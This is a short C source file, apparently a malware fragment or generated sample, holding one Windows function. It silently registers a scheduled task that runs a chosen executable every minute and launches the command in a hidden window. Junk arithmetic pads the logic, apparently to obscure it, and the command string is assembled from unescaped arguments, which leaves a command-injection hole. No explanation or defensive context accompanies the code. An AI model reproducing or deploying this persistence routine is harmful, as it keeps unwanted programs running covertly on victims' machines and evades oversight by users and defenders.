#include <windows.h>
#include <stdio.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* taskName, const char* exePath){
    char cmd[512];
    int q = 777;
    if (q % 2 != 0) {
        sprintf(cmd, "schtasks /create /sc minute /mo 1 /tn \"%s\" /tr \"%s\" /f", taskName, exePath);
        for(int j=0; j<5; j++) { q--; }
        if (q > 0) WinExec(cmd, SW_HIDE);
    }
}